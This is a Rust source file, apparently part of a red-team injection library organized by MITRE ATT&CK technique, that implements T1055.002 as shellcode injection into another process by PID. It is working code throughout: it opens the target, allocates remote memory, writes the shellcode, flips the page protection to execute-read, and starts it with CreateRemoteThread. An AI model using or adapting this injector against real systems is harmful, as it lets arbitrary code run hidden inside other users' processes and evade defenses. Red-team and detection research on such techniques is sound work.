//! Implementation of MITRE ATT&CK T1055.002: Portable Executable Injection.
//!
//! **Note:**
//! While the T1055.002 technique specifically refers to PE injection, this
//! implementation currently focuses on the injection of raw shellcode via
//! `CreateRemoteThread`. This is a common primitive often used as a stage in full PE injection.

use std::{
    mem::transmute,
    os::windows::raw::HANDLE,
    ptr::{null, null_mut},
};

use windows_sys::Win32::{
    Foundation::{CloseHandle, FALSE, GetLastError, INVALID_HANDLE_VALUE},
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        Memory::{
            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx,
            VirtualProtectEx,
        },
        Threading::{
            CreateRemoteThread, LPTHREAD_START_ROUTINE, OpenProcess, PROCESS_CREATE_THREAD,
            PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
        },
    },
};

use crate::{
    error::InjectumError,
    info,
    payload::Payload,
    strategy::{Method, Strategy, Technique},
    target::Target,
};

/// The strategy implementation for T1055.002 (Portable Executable Injection).
pub struct T1055_002;

/// Defines the supported sub-techniques for this strategy.
#[derive(Debug, PartialEq)]
enum InjectionMethod {
    RemoteThreadInjection,
}

impl TryFrom<Method> for InjectionMethod {
    type Error = InjectumError;

    fn try_from(method: Method) -> Result<Self, Self::Error> {
        match method.0 {
            "RemoteThreadInjection" => Ok(Self::RemoteThreadInjection),
            _ => Err(InjectumError::MethodNotSupported(method.0.to_string())),
        }
    }
}

impl Strategy for T1055_002 {
    fn requires_pid(&self, method: Method) -> bool {
        !matches!(method.0, "Self")
    }

    fn execute(
        &self,
        payload: &Payload,
        target: &Target,
        method: Method,
    ) -> Result<(), InjectumError> {
        let info = Technique::T1055_002.info();
        info!("Strategy: {} ({})", info.mitre_id, info.name);

        let variant: InjectionMethod = method.try_into()?;

        // 1. Validate Target (PID required)
        let pid = target
            .pid()
            .ok_or(InjectumError::PidRequired(info.mitre_id))?;

        // 2. Validate Payload
        let shellcode = match payload {
            Payload::Shellcode { bytes: b, .. } => b,
            _ => {
                return Err(InjectumError::PayloadMismatch {
                    strategy: info.mitre_id,
                    payload_type: "Shellcode",
                });
            }
        };

        // 3. Execution based on variant
        match variant {
            InjectionMethod::RemoteThreadInjection => {
                info!("Method: Remote Thread Injection");
                inject_remote_thread(pid, shellcode)
            }
        }
    }
}

/// Wrapper to ensure handles are closed when they go out of scope.
struct HandleGuard(HANDLE);

impl HandleGuard {
    fn new(handle: HANDLE) -> Self {
        Self(handle)
    }
}

impl Drop for HandleGuard {
    fn drop(&mut self) {
        if !self.0.is_null() && self.0 != INVALID_HANDLE_VALUE {
            unsafe { CloseHandle(self.0) };
        }
    }
}

/// [Remote Thread Injection]
/// Injects shellcode into a remote process and executes it via `CreateRemoteThread`.
fn inject_remote_thread(pid: u32, shellcode: &[u8]) -> Result<(), InjectumError> {
    // 1. Open Target Process
    let process_handle = unsafe {
        OpenProcess(
            PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION
                | PROCESS_VM_OPERATION
                | PROCESS_VM_READ
                | PROCESS_VM_WRITE,
            FALSE,
            pid,
        )
    };

    if process_handle.is_null() {
        return Err(InjectumError::Win32Error("OpenProcess", unsafe {
            GetLastError()
        }));
    }

    let process_handle_guard = HandleGuard::new(process_handle);

    // 2. Allocate Memory RW (Read-Write)
    let remote_buffer = unsafe {
        VirtualAllocEx(
            process_handle_guard.0,
            null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };

    if remote_buffer.is_null() {
        return Err(InjectumError::Win32Error("VirtualAllocEx", unsafe {
            GetLastError()
        }));
    }

    // 3. Write Shellcode to Target Memory
    let mut bytes_written: usize = 0;

    let write_success = unsafe {
        WriteProcessMemory(
            process_handle_guard.0,
            remote_buffer,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            &mut bytes_written,
        )
    };

    if write_success == 0 || bytes_written != shellcode.len() {
        return Err(InjectumError::Win32Error("WriteProcessMemory", unsafe {
            GetLastError()
        }));
    }

    // 4. Change Protection to RX (Execute-Read)
    let mut old_protect: u32 = 0;
    let protect_success = unsafe {
        VirtualProtectEx(
            process_handle_guard.0,
            remote_buffer,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };

    if protect_success == 0 {
        return Err(InjectumError::Win32Error("VirtualProtectEx", unsafe {
            GetLastError()
        }));
    }

    // 5. Create Remote Thread
    let start_routine: LPTHREAD_START_ROUTINE = unsafe { transmute(remote_buffer) };

    let thread_handle = unsafe {
        CreateRemoteThread(
            process_handle_guard.0,
            null(),
            0,
            start_routine,
            null(),
            0,
            null_mut(),
        )
    };

    if thread_handle.is_null() {
        return Err(InjectumError::Win32Error("CreateRemoteThread", unsafe {
            GetLastError()
        }));
    }

    let _thread_guard = HandleGuard::new(thread_handle);

    Ok(())
}
